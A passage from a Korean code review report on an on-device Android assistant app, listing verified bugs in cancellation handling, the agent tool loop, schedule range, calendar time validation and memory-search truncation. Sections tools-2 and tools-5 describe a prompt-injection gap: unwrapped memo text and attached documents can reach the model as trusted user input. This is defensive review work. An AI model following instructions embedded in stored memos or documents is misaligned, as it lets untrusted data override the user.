- 제안: 상태 대입을 한 함수(setIfActive)로 모아 취소된 작업은 쓰지 못하게 하고, launch 본문 끝에 finally 로 "상태가 아직 Waiting/Running 이면 Idle"을 둔다. core-3 의 예외 처리기와 같은 변경으로 묶을 수 있다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/cleanup/MemoryCleanupRunner.kt:127-131, 143-147 — 단계 사이의 Blocked·Running 대입은 isActive 를 보지 않음(진행 콜백 134·150줄과 Review 159줄만 봄)
  - app/src/main/java/com/kosmos/app/assistant/cleanup/MemoryCleanupRunner.kt:194-203 — cancel() 은 job 을 취소하고 곧바로 Idle 로 바꿈 — 그 뒤 취소된 작업의 대입이 이를 덮을 수 있음
  - app/src/main/java/com/kosmos/app/assistant/cleanup/MemoryCleanupRunner.kt:91-92 — scope 에 예외 처리기가 없고 job 은 동기화 없는 일반 변수
- 검증: 직접 확인: MemoryCleanupRunner.kt:111·127-131·143-147 의 상태 대입은 isActive 를 보지 않고(134·150·159 만 봄), 194-203 cancel() 은 job 취소 뒤 Idle, 91-92 scope 에 예외 처리기 없음·job 은 일반 변수 — 사실 관계는 맞다. 그러나 핵심 재현 설명('취소된 판정 추론이 끝까지 가고 유스케이스가 정상 반환해 Idle 을 덮는다')은 대체로 성립하지 않는다: 추론은 GemmaModelRunner.runTurn 의 withContext(llmDispatcher) 안에서 돌고, 호출자가 취소된 상태면 withContext 가 돌아오는 순간 CancellationException 을 던진다. runner 의 catch 도 ensureActive 로 다시 던지고, domain/cleanup 유스케이스들에는 catch·runCatching 이 하나도 없다(grep 0건) → 취소된 작업은 유스케이스에서 예외로 빠져나가 127·131·143·147 에 닿지 않는다. 남는 것은 cancel() 의 Idle 대입과 다른 스레드의 비가드 대입(특히 111줄)이 수 마이크로초 창에서 엇갈리는 이론적 경합뿐이고, 화면의 취소 버튼으로 풀린다. 따로 유효한 부분: 예외 처리기 없는 scope(91줄)에서 유스케이스가 예상 밖 예외를 던지면 앱이 죽는다 — core-3 수정에 묶어 처리기 하나 다는 정도가 적정.
- 앞선 기록: CHANGELOG 0.40.6 M3(518줄)·docs/plans/0.40.6-runtime-optimization.md:223 — 사용자 활동 시 계획 단계 취소(결정 D2=A). CHANGELOG 408줄 — ConversationPrewarmer 스코프에 예외 처리기를 단 전례

### core-10 · 툴 루프가 300줄짜리 한 함수에 변수 열두어 개로 얽혀 있고, 주석이 없는 함수·옛 경위를 가리킨다
- 판정 확인됨 · 중요도 낮음 · 크기 M
- 왜: 이 함수가 앱의 중심 상태 기계라 면접에서 가장 먼저 열어 볼 코드다. core-1·2·8 이 모두 "끝나는 길이 여러 갈래인데 갈래마다 챙길 것(한 일 목록·대화 무효화·결과 카드)이 달라서" 생긴 누락이다 — 구조가 결함을 만들고 있다. 주석이 실제와 다르면 설명할 때 스스로 걸린다.
- 제안: 동작을 바꾸지 않는 정리로 한 회차를 잡는다. (1) 한 차례의 호출 묶음 실행(190-273줄)을 StepResult(결과 목록·대상 이름·용량 멈춤·검색 표시·결과 카드)를 돌려주는 private 함수로 뺀다. (2) 턴이 끝나는 방식을 봉인 타입(모델 답 / 앱 문장 / 오류)으로 만들어 저장·무효화·한 일 목록 처리를 한 곳에서 한다 — core-1·2·8 의 수정이 이 자리 하나로 모인다. (3) 주석은 이유 한두 문장 + ADR 참조로 줄이고 없는 함수 이름을 고친다. 기존 BaseAgent 테스트 묶음이 단언 그대로 통과하는 것을 게이트로 삼는다.
- 근거:
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:68-377 — executeToolLoop 한 함수: 스트리밍 파싱, 반복 상한, 용량 가드, 호출별 실행, 감사, 검색 표시, 거절·부분 문장, 답 고치기, 저장을 모두 담고 var 13개(lastTurn·parsedResult·isFirstTurn·loopCount·searchUsed·searchFailed·messageResult·anyExecuted·memoCalled·previous·kvStopped·writeIndex·prompt)
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:172, AssistantOrchestrator.kt:84 — 주석이 지금은 없는 handleErrorAndReturn 을 가리킴(실제는 messageWriter.saveError)
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:76-79, 84-85, 109-115, 172-175 및 KosmosAgent.kt:28-33 — "예전에는 …" 식 경위 주석(AGENTS §3-② 는 경위를 CHANGELOG·ADR 에 두라고 정함)
  - app/src/main/java/com/kosmos/app/assistant/agent/BaseAgent.kt:107, 117-118 — "O(n²) 복사를 피한다"는 주석 바로 아래에서 토큰마다 accumulated.toString() 으로 전체를 복사
- 검증: 직접 확인: BaseAgent.kt:68-377 이 한 함수(약 310줄)이고 가변 변수는 prompt·lastTurn·parsedResult·isFirstTurn·loopCount·searchUsed·searchFailed·messageResult·anyExecuted·memoCalled·previous·text 와 루프 안 tagSeen·tailWindow·writeIndex·kvStopped — '열두어 개'는 맞다. 172줄과 AssistantOrchestrator.kt:84 주석이 가리키는 handleErrorAndReturn 은 제품 코드에 없다(grep: 주석 3곳과 테스트 주석 2곳뿐, 실제는 messageWriter.saveError). '예전에는/이전에는' 경위 주석은 BaseAgent.kt:77·84·172·302·342, KosmosAgent.kt:28 에서 확인 — AGENTS §3-② 와 어긋난다. 107줄 'O(n²) 복사를 피한다' 바로 아래 117-118줄에서 토큰마다 accumulated.toString() 으로 전체를 복사하는 것도 맞다(주석과 코드 불일치, 성능 영향은 답 길이상 작음). 보정: 구조 분리는 0.39.x 에서 이미 한 번 했으므로 '분리 기록 없음'은 부정확 — 이번 제안은 그 다음 단계(호출 묶음 실행, 끝나는 갈래 통합)다. core-1·2·8 이 모두 '끝나는 갈래마다 챙길 것이 다름'에서 나온다는 진단은 내가 읽은 코드와 일치한다(151-160, 165-185, 274-280, 286-299, 317 이후가 각각 다른 것을 챙김). 동작 불변 정리이므로 core-1·2·8 수정과 같은 회차에 묶되, 결함 수정 커밋과 정리 커밋은 나누는 편이 안전.
- 앞선 기록: CHANGELOG 623줄 '툴 루프를 단계로 (M1)' — 판정을 ToolCallGuards·ReplyFinisher·PendingMemos 로 이미 한 차례 분리(ADR-030, architecture.md:2073). CHANGELOG 0.35.1(주석 수치 정리). 호출 묶음 실행·끝나는 방식의 추가 분리는 기록 없음

<details><summary>읽은 범위</summary>

읽은 것(전부 직접 읽음): agent/BaseAgent·KosmosAgent·PendingMemos·ReplyFinisher·ToolCallGuards·ToolOutcome, orchestrator/AssistantOrchestrator·AssistantMessageWriter·AttachedDocumentBlock·ConversationPrewarmer, approval/ApprovalCoordinator·ApprovalRequest, context/ContextBuilder·ToolParser, cleanup/BackgroundInferenceGate·MemoryCleanupRunner, episode/EpisodeBoundaryManager·EpisodeFactExtractor·EpisodeSummarizeScheduler·SummaryQuietDelay. 범위 밖이지만 근거 확인을 위해 일부만 읽은 것: GemmaModelRunner 의 generate·cancel·close 구간과 TurnCancellation, ChatViewModel 의 전송·중지·승인 구간, SendChatMessageUseCase, MemoryCleanupViewModel·Screen 의 상태 분기, ToolArguments.optString, LibraryEmbedder·MemoryEmbedder 의 멈춤·재개 함수, ApplyEpisodeMergeUseCase, ModelRunner.deferRestore, KosmosApp.onStop, Constants 일부.
다 읽지 못한 것: context/PromptAssembler 는 assembleWithTools(33-92줄)와 함수 목록만 봤고 시스템 지시·형식 블록 본문은 읽지 않았다(모델 입력이라 제안 대상에서도 뺌). context/DataMarker·ProfileBlock, :domain 의 가드 판정(MemoSaveIntent·RefusalTurns·ScheduleTimeIntent 등)과 계획 유스케이스(PlanMemoryMerge·PlanEpisodeMerge·GenerateWeeklyReview) 본문은 읽지 않았다. 테스트·gradle·adb·실험은 규칙대로 돌리지 않았으므로 모든 항목은 코드 읽기로만 확인한 것이다 — core-5(이중 탭)와 core-7(cancelProcess 뒤 오류 종류)은 실기기 동작을 확인하지 않아 medium, core-9 는 유스케이스 본문을 읽지 않아 low.
그래프 도구는 쓰지 않았다(grep·파일 읽기로 충분).
뺀 것 4건: (1) 문서 첨부 턴에서 사용자 질문과 문서 블록이 같은 createdAt 으로 저장되고 조회가 createdAt 만으로 정렬돼 순서가 정해지지 않는 점 — 질문 중복 자체는 CHANGELOG 0.41.x '히스토리의 질문 중복은 그대로 둔다(계획 결정)'로 의도된 것이고 순서 문제는 모델 입력 실측이 필요해 뺌. (2) 한 대화가 여러 주제로 요약될 때 applyDocs 의 수정 1건 + 추가 n건이 한 트랜잭션이 아닌 점과 추가 행에는 메시지가 배정되지 않는 점 — 피해가 작고 M0 게이트에서 정한 설계. (3) 예산 리셋으로 닫힌 에피소드에 그 턴의 답이 닫힌 뒤 붙어 messageCount·endAt 이 한 턴 어긋나는 점 — 표시 수치만 영향. (4) PendingMemos 가 프로세스 메모리라 앱이 죽으면 '막아 둔 메모'가 사라지고, 턴이 오류로 끝나도 take 로 이미 소비되는 점 — 다음 턴에 앞 사용자 말로 대체되는 길이 있어 영향이 작음.

</details>

## 툴 실행기 (tools)

### tools-1 · 일정 조회 툴이 오늘부터 7일까지만 본다 — 그보다 먼 약속을 물으면 "없다"고 답한다
- 판정 확인됨 · 중요도 높음 · 크기 M · 모델 입력
- 왜: 실사용에서 가장 흔한 흐름이 깨진다. 오늘 "12월 5일 치과 예약"을 앱으로 넣고 내일 "치과 예약 언제였지?"라고 물으면, 조회 범위(오늘~6일 뒤)에 그 일정이 없어 모델은 "등록된 일정이 없어요"라고 답한다 — 앱이 직접 저장한 일정을 앱이 부정하는 셈이다. "다음 주 일정"도 요일에 따라 절반쯤 빠지고, "어제 회의 몇 시였지"는 항상 빠진다. 틀린 답이 성공처럼 나가는 종류라 사용자가 알아채기 어렵고, 면접에서 "일정 비서"의 기본 기능 한계로 바로 지적될 수 있다.
- 제안: 오늘이 아닌 조회의 범위를 넓힌다. 가장 작은 변경은 WEEK 의 끝을 오늘+30일(또는 +60일) 정도로 늘리고, 결과는 지금처럼 가까운 순으로 싣고 토큰 상한(지금 400)에서 뒤부터 잘리게 두는 것이다(가까운 일정이 남는다). 화면(오늘 탭·위젯·브리핑)은 같은 RangeType.WEEK 를 쓰므로 툴 전용 범위(예: RangeType.UPCOMING 또는 유스케이스에 일수 인자)를 따로 두는 편이 안전하다. 목록이 길어지면 "내일 일정" 같은 질문에서 날짜 고르기가 흔들릴 수 있으므로 0.40.6 때 쓴 일정 문항(exp73 형식)과 회귀 세트로 먼저 잰다. 지난 일정 질문까지 받으려면 시작을 며칠 앞으로 당기는 것도 같은 실측에 포함한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/usecase/GetTodayScheduleUseCase.kt:58-60 — 주간 범위의 끝이 today.plusDays(6), 시작은 오늘 0시(과거도 안 봄)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/GetScheduleToolExecutor.kt:47-52 — date 인자가 today 가 아니면 전부 WEEK 로만 넓힘(그 이상 넓은 범위 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/GetScheduleToolExecutor.kt:102-103 — 꼬리 안내가 "그 날짜에 일정이 없으면 없다고만 답하라"고 시킴
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/context/PromptAssembler.kt:279 — 날짜 제한이 없는 질문("약속 언제였지", "치과 몇 시였지")을 get_schedule 로 보내는 규칙
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/runtime/gemma/KosmosToolDeclarations.kt:122 — 선언이 "다음주"도 'week' 로 보내라고 하지만 월요일에 물은 다음 주 수요일(+9일)은 범위 밖
- 검증: 직접 읽음: domain/.../usecase/GetTodayScheduleUseCase.kt:53(시작=오늘 0시), 59-60(WEEK 끝=today.plusDays(6)), RangeType 은 TODAY·WEEK 둘뿐. app/.../tool/GetScheduleToolExecutor.kt:47-52(today 가 아니면 전부 WEEK), 102-103(그 날짜에 없으면 없다고만 답하라는 꼬리 안내), 59(0건이면 '등록된 일정이 없어요.'). PromptAssembler.kt:279 는 '약속 언제였지'·'치과 몇 시였지'를 get_schedule 로 보낸다. KosmosToolDeclarations.kt:122 는 '다음주'도 'week' 로 보내라고 하지만 실제 범위는 오늘+6일이라 요일에 따라 다음 주 일부가 빠진다. 다른 경로로 먼 일정을 찾는 툴은 없다(월 조회 month() 는 화면 전용). 주장 그대로 성립. 보충: CalendarViewModel.kt:82 도 RangeType.WEEK 를 쓰므로 범위를 넓힐 때 툴 전용 범위로 분리해야 한다는 제안도 맞다. 목록이 길어지면 날짜 고르기가 흔들릴 수 있어 실측 선행(모델 입력 변경) 표시도 타당.
- 앞선 기록: CHANGELOG 0.40.6 M2(exp73 — 주간 목록·날짜 대조 꼬리 안내). 7일 밖 일정을 못 본다는 한계는 CHANGELOG·architecture·plans·README 에서 찾지 못함

### tools-2 · 기억 검색 결과 맨 위 "(방금 이 대화)" 줄에 첨부 문서 전체·긴 붙여넣기가 통째로 실려 실제 검색 결과가 잘려 나간다
- 판정 확인됨 · 중요도 중간 · 크기 S · 모델 입력
- 왜: 재현 경로: 문서를 첨부해 대화한 뒤 30분 안에 "회의 관련해서 내가 저장한 거 있어?"처럼 문서에 나오는 낱말로 기억을 물으면, 문서 블록이 낱말 겹침 0.5 를 쉽게 넘겨 "(방금 이 대화)" 줄로 뽑힌다. 그 한 줄이 수천 자라 400토큰 상한에서 실제 메모·과거 대화·끝 안내가 전부 잘리고, 모델은 문서 조각을 "사용자가 방금 말한 가장 최신 값"으로 받는다(메모가 섞이면 그렇게 믿으라는 안내까지 붙는다). 저장된 기억이 있는데도 못 찾거나 문서 내용을 기억처럼 답하게 된다. 긴 글을 붙여 넣은 사용자 메시지(최대 8,192자)도 같은 결과다. 문서 첨부는 실사용에서 자주 쓰는 기능이라 걸릴 가능성이 높다.
- 제안: CurrentConversationLines.pick 에서 ① 첨부 문서 블록("[Attached Document" 로 시작하는 메시지 — 판별 함수를 :domain 으로 내리거나 호출하는 쪽에서 미리 거름)을 후보에서 빼고 ② 한 줄 길이 상한(예: 200자, 넘으면 후보에서 제외 — 값 한 줄을 다시 말한 경우만 싣는 것이 원래 목적)을 둔다. "지금 던진 질문 빼기"는 drop(1) 대신 이번 턴 메시지와 내용·시각이 같은 것을 빼도록 바꿔 같은 시각 문서 블록 때문에 질문 자신이 남는 일을 막는다. currentHead 의 시각은 생성자 now 인자로 받는다(AddReminderToolExecutor 방식). 회귀 세트가 이 판정식을 흉내 내므로 흉내도 같이 고치고 newval·repeat 세트를 다시 돌린다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/memory/CurrentConversationLines.kt:28-37 — 역할이 USER 인 메시지를 길이 제한 없이 그대로 싣고(줄바꿈만 공백으로), 첨부 문서 블록을 거르지 않음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/orchestrator/AssistantOrchestrator.kt:108,122-123 — 첨부 문서도 USER 역할 메시지로 저장하며 질문과 같은 시각(now)을 씀
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:235-240 — currentHead 가 최근 30개 메시지를 그대로 넘기고, 237줄에서 벽시계(System.currentTimeMillis)를 직접 읽음(AGENTS §2-④ 어긋남)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:118,154,379-385 — head 를 맨 앞에 붙인 뒤 전체를 앞에서부터 400토큰으로 자름(뒤의 메모·안내가 먼저 잘림)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/data/src/main/java/com/kosmos/app/data/local/db/dao/ConversationDao.kt:14 — createdAt 내림차순만이라 같은 시각의 질문·문서 블록 순서가 정해지지 않음(drop(1) 이 어느 쪽을 뺄지 불확정)
- 검증: 직접 읽음: domain/.../memory/CurrentConversationLines.kt:28-37 — USER 역할 + 30분 창만 거르고 길이 상한·첨부 블록 제외가 없다(줄바꿈만 공백으로). AssistantOrchestrator.kt:108,122-123 — 첨부 문서를 USER 역할, 질문과 같은 now 로 저장. AttachedDocumentBlock.bodyOrNull 을 쓰는 곳은 ChatBubbles.kt:101 뿐(검색 쪽은 거르지 않음). BigramMatcher.kt:132-141 bestTermOverlap 은 '질의 낱말의 바이그램 중 문서에 있는 비율'이라 긴 문서는 0.5 를 쉽게 넘는다. SearchMemoryToolExecutor.kt:235-240(벽시계 직접 읽음 — §2-④ 어긋남도 사실), 118·154·174·190·231(head 를 맨 앞에 붙임), 379-385(전체를 앞에서부터 400토큰으로 자름 — SentenceTruncator.kt:29-53 은 접두사만 남긴다). 따라서 이전 턴에 첨부한 문서가 뽑히면 메모·끝 안내·자료 끝 표지가 전부 잘린다는 경로가 성립. 덧붙임: 방금 줄은 DataMarker 밖이고 '사용자가 방금 말한 가장 최신 값' 안내(CURRENT_FIRST_GUIDE)가 붙으므로 문서 내용이 사용자 말로 승격된다. 세부 보정: ConversationDao.kt:14 동률 순서 불확정은 맞지만 같은 턴에 문서를 붙인 경우에만 해당하는 부차적 문제(주 재현 경로는 '앞 턴에 첨부 → 30분 안에 기억 질문'). 재현 빈도는 실측된 적 없음.
- 앞선 기록: CHANGELOG 0.38.8 M2(exp62c — 방금 대화 줄 도입), 0.39.3 M4c(exp69), 0.42.0 M1(자료 표지 — '안내·방금 대화 줄은 밖'). 첨부 문서 블록·긴 메시지가 이 줄에 실리는 경우는 기록 없음

### tools-3 · 일정 추가가 끝 시각이 시작보다 앞인지 확인하지 않는다 — 자정을 넘기는 일정이 뒤집힌 채 저장되고 기기 캘린더에도 그대로 들어간다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: "밤 11시부터 새벽 1시까지 야간 작업 잡아줘"에 작은 모델은 시작과 끝을 같은 날짜(23:00, 01:00)로 쓰기 쉽다. 승인 시트에는 "오후 11:00 / 오전 1:00까지"로 멀쩡히 보여 그대로 승인되고, 앱 DB 에는 끝이 시작보다 22시간 앞인 일정이, 기기 캘린더에는 끝이 시작보다 앞인 이벤트가 남는다(삼성 캘린더에서 어떻게 보일지는 미확인 — 안 보이거나 이상하게 보일 수 있음). 화면은 방어 코드로 가려져 있어 잘못된 데이터가 조용히 쌓이고, 내보내기·백업에도 그대로 실린다. 사용자의 실제 캘린더를 더럽히는 쪽이라 "동기화 안 됨"보다 나쁘다.
- 제안: AddScheduleToolExecutor.parse 에서 두 시각을 IsoDateTimeParser.toEpochMillis 로 비교한다. 끝 <= 시작이고 끝이 시각을 가진 값이면 끝에 하루를 더해 다음 날로 보정(자정 넘김), 그래도 앞이면(하루 넘게 앞) 끝 시각을 버려 기본 길이(1시간)로 떨어뜨린다. 승인 시트가 보정된 값을 보여 주므로 사용자가 확인할 수 있다. 모델에게 돌려주는 문구는 바뀌지 않는다(조용한 보정). AndroidCalendarTool.insert 에도 같은 방어(끝 <= 시작이면 시작+1시간)를 한 줄 둔다 — 다른 호출 경로 대비. 테스트 3개(같은 날 뒤집힘 → 다음 날, 크게 뒤집힘 → 끝 없음, 정상 유지).
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/AddScheduleToolExecutor.kt:91-99 — parse 가 startTime·endTime 을 각각 형식만 검증하고 둘의 앞뒤를 비교하지 않음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/approval/ApprovalSheet.kt:107 — 승인 시트는 끝 시각을 "시각만"(예: 오전 1:00까지) 보여 줘 날짜가 뒤집힌 것을 사용자가 볼 수 없음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/platform/calendar/AndroidCalendarTool.kt:129-140 — 끝 시각을 검증 없이 DTEND 로 써서 DTEND < DTSTART 인 이벤트가 기기 캘린더에 들어감
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/util/IsoDateTimeParser.kt:85 — 표시 쪽은 끝<=시작이면 시작만 보여 주도록 이미 방어(=이런 데이터가 생긴다는 것을 아래층은 알고 있음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/test/java/com/kosmos/app/assistant/tool/AddScheduleToolExecutorTest.kt:27-61 — 끝<시작 경우의 테스트 없음
- 검증: 직접 읽음: AddScheduleToolExecutor.kt:91-99 — startTime·endTime 을 각각 형식만 검증, 비교 없음. ToolCallGuards.kt:65-84 의 일정 가드도 startTime 만 본다(endTime 을 보는 가드 없음 — grep 결과 0건). ApprovalSheet.kt:107 — 끝은 toDisplayTimeKorean(시각만)이라 날짜가 뒤집힌 것이 시트에 안 보인다. AndroidCalendarTool.kt:129-140 — endMs 를 검증 없이 DTEND 로 기록. AddScheduleUseCase.kt:42 — endDateIso 그대로 저장. 표시 쪽 방어는 IsoDateTimeParser.kt:85, MonthGrid.kt spanDays('if (end.isBefore(start)) end = start'). AddScheduleToolExecutorTest.kt 의 테스트 4개(27·39·52·61줄)에 끝<시작 경우 없음. 주장 성립. 보정: 모델이 자정 넘김을 같은 날짜로 쓰는 빈도, 기기 캘린더 제공자가 DTEND<DTSTART 를 받아들이는지는 코드로 확인 불가(미측정) — 심각도는 '사용자 실제 캘린더에 뒤집힌 값이 들어갈 수 있음' 기준으로 중간 유지. 제안(끝에 하루 더하기)은 툴 결과 문구를 안 바꾸므로 모델 입력 불변 표시도 맞다.
- 앞선 기록: CHANGELOG 0.33.0(spanDays — 끝이 시작보다 앞이면 하루로 화면만 방어), 0.40.6 M2(toDisplayRangeKorean). 입력 단계에서 끝<시작을 검증한다는 기록은 없음

### tools-4 · 연도가 틀린(지난) 날짜의 일정이 승인 시트에서 구별되지 않는다 — 연말에 "1월 5일"이 올해 1월로 들어갈 수 있다
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 12월에 "1월 5일 3시에 병원 예약 잡아줘"라고 하면 모델이 올해 연도로 쓸 수 있다(작은 모델의 연도 실수는 흔하고, 연도 넘김은 실측한 적이 없다). 날짜를 말했으니 지난 시각 가드는 통과하고, 시트에는 "1월 5일 (월) 오후 3:00"만 보여 연도가 틀린 것을 알 길이 없다(요일만 다르다). 승인하면 11개월 전 일정으로 저장돼 오늘·주간·월 화면 어디에도 안 보이고, 조회 툴도 못 찾는다 — 사용자는 등록됐다고 믿고 약속을 놓친다. 지금이 11월 하순이라 실사용 기간 안에 바로 맞닥뜨릴 시점이다.
- 제안: 모델 입력을 건드리지 않는 화면 쪽 방어부터: ① 승인 시트 날짜에 올해가 아니면 연도를 붙인다("2026년 1월 5일 (월)"). ② 시작이 지금보다 과거면 시트의 경고 줄(이미 있는 footnote 자리)에 "지난 날짜예요"를 띄운다 — 지난 일 기록은 계속 허용하되 눈에 띄게. 이 두 가지는 실측 없이 가능하다. 그다음 선택 사항으로, 사용자가 연도 없이 월·일만 말했고 그 날짜가 올해 기준 이미 지났다면 가드에서 막고 내년인지 묻게 하는 안(지난 시각 가드와 같은 방식)은 툴 결과 문구가 늘어나므로 회귀 세트의 지난 시각 문항에 연말 문항을 더해 잰 뒤 결정한다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/agent/SchedulePastIntent.kt:19-23,36 — 사용자가 날짜 낱말("N월", "N일", 요일 등)을 말했으면 지난 시각이어도 막지 않음(지난 일을 기록하려는 것으로 봄)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/AddScheduleToolExecutor.kt:39-58 — 일정은 알림과 달리 지난 시각 검사가 없음(AddReminderToolExecutor.kt:57-60 은 PAST 로 막음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/feature/approval/ApprovalSheet.kt:157-164 — 시트의 날짜 표기가 toDisplayDateKorean
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/domain/src/main/java/com/kosmos/app/domain/util/IsoDateTimeParser.kt:157-169 — 그 표기는 "M월 d일 (요일)"로 연도가 없음
- 검증: 코드 사실은 맞다: SchedulePastIntent.kt:19-23,36 — '\d+\s*월'·'\d+\s*일' 등 날짜 낱말이 있으면 지난 시각이어도 null(통과). AddScheduleToolExecutor.kt:39-58 — 지난 시각 검사 없음(AddReminderToolExecutor.kt:57-60 은 PAST). ApprovalSheet.kt:157-164 dayOf → IsoDateTimeParser.kt:157-169 toDisplayDateKorean 은 'M월 d일 (요일)'로 연도가 없다. 지난 날짜 경고도 없다(footnote 는 ChatScreen.kt:549 에서 부정확 알람 안내에만 쓰임). 틀린/확인 못 한 부분: 출발점인 '모델이 연말에 올해 연도로 쓴다'는 실측이 없는 추정이다 — 시스템 지시 날짜 줄은 Today=yyyy-MM-dd 로 연도를 주고(PromptAssembler.kt:192-212), 실제로 얼마나 틀리는지는 재 본 기록이 없다. 그래서 결함이 아니라 '틀렸을 때 사용자가 알아챌 수단이 없다'는 빈틈으로만 인정한다. 화면 쪽 두 가지(올해가 아니면 연도 표기, 지난 날짜 경고 줄)는 모델 입력을 안 건드려 실측 없이 가능하다는 판단은 맞다. 세 번째 안(가드로 내년인지 묻기)은 툴 결과 문구가 늘어 실측 대상이며, 날짜 줄에 연도를 더 싣는 방향은 이미 기각된 결정이라 피해야 한다.
- 앞선 기록: CHANGELOG 0.42.5 M1(exp99 — 날짜 없이 말한 지난 시각만 가드), 0.42.7(날짜 낱말이 있으면 통과), 0.41.11 M2(exp88 — 날짜 줄에 연도까지 쓰는 W3 안은 +30토큰이라 기각, 사용자 결정 — PromptAssembler.kt:202). 승인 시트의 연도 표기·연말 넘김 자체는 기록 없음

### tools-5 · 기억 검색 결과를 통째로 400토큰에서 자른다 — 긴 메모 하나가 끝 안내와 "자료 끝" 표지를 밀어내고, 못 찾았을 때 보여 주는 최근 메모는 자료 표지 없이 나간다
- 판정 확인됨 · 중요도 중간 · 크기 M · 모델 입력
- 왜: 메모는 길이 제한 없이 저장된다(붙여 넣은 문단, 긴 과거 대화 요약). 상위 3건 중 한 건이 길면 ① 나머지 결과가 잘리고 ② "[자료 끝]" 표지와 "목록에 답이 없으면 대화에서 말한 내용으로 답하라" 안내가 사라진다. 이 안내와 표지는 각각 실측으로 넣은 장치(대화 속 답 4/6→5/6, 메모 속 지시 따르기 0)라서, 잘리면 그 실측이 보장하던 행동이 조용히 풀린다. 또 검색어가 아무것도 못 맞혔을 때는 최근 메모 3건이 표지 없이 나가므로, 메모 본문에 지시처럼 읽히는 문장이 있으면 0.42.0 에서 막은 경로가 이쪽으로 열려 있다.
- 제안: ① successJson 을 일정 조회와 같은 모양으로: 목록 부분만 (상한 − 머리·안내·표지 토큰)으로 자르고, 표지 끝과 안내는 자른 뒤에 붙인다. ② 결과 한 건의 글자 상한을 둔다(문서 검색의 300자와 같은 식 — 긴 메모는 앞부분만, 뒤는 "…"). ③ 못 찾았을 때의 최근 메모 목록도 DataMarker.wrap 으로 감싼다. ①은 넘칠 때만 결과가 달라지고 문구는 그대로지만, ②③은 모델이 받는 글이 바뀌므로 회귀 세트(newval·repeat·주입 세트)와 0.42.0 의 주입 문항을 다시 돌린 뒤 넣는다. 자료 표지를 붙이면 결과 턴에 약 22토큰이 더 든다는 기록이 있으니 ③의 비용도 같이 잰다.
- 근거:
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:314 — 본문 = 자료 표지로 감싼 목록 + 끝 안내(HIT_TAIL)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:379-385 — 안내까지 한 덩어리로 앞에서부터 자름(메모 한 건의 길이 상한 없음)
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/GetScheduleToolExecutor.kt:81-89 — 같은 문제를 일정 조회에서는 "목록만 자르고 꼬리 안내는 뒤에 붙인다"로 이미 고침
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchMemoryToolExecutor.kt:206-208,223-225 — 못 찾았을 때 싣는 "가장 최근에 저장된 기억" 목록과 태그 목록은 DataMarker 로 감싸지 않음
  - C:/Users/SSAFY/Desktop/dev/lets_meet_on_friday/app/src/main/java/com/kosmos/app/assistant/tool/SearchDocumentsToolExecutor.kt:111 — 문서 검색은 조각마다 글자 상한(LIBRARY_RESULT_CHARS)을 둠(기억 검색에는 없음)
- 검증: 직접 읽음: SearchMemoryToolExecutor.kt:314 — body = DataMarker.wrap(목록) + tail, 328 — guide + body, 379-385 — head·guide·목록·표지 끝·tail 을 한 덩어리로 앞에서부터 400토큰(Constants.kt:94,102 — 500−100)에 자름. 결과 한 건 길이 상한 없음(Hit.text = note.content 그대로, 355-358줄). 대조: GetScheduleToolExecutor.kt:81-89 는 목록만 자르고 꼬리를 뒤에 붙임, SearchDocumentsToolExecutor.kt render 는 조각마다 take(LIBRARY_RESULT_CHARS=300). 못 찾았을 때 경로 206-208·223-225 의 format(allNotes.take(3)) 은 DataMarker 로 감싸지 않음 — 0.42.0 의 '메모 본문 속 지시' 방어가 이 경로에는 없다(사실). 보정: 모델이 쓰는 메모 인자는 보통 짧고(승인 시트 미리보기도 80자 기준) 긴 메모는 주로 사용자가 직접 편집하거나 긴 과거 대화 요약에서 나오므로 잘림 쪽 발생 가능성은 낮은 편, 표지 누락 쪽이 더 확실한 빈틈이다. 세 수정 모두 모델이 